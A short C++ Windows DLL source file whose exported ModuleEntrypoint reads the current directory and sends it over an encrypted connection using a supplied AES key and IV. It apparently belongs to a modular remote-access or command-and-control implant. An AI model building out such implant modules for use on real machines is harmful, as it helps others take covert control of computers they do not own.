#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <structs.h>

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	PATH response = { 0 };
	char path[254];
	GetCurrentDirectoryA(254, path);
	response.path_length = strlen(path);
	memcpy(response.path, path, strlen(path));
	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
	return 0;
}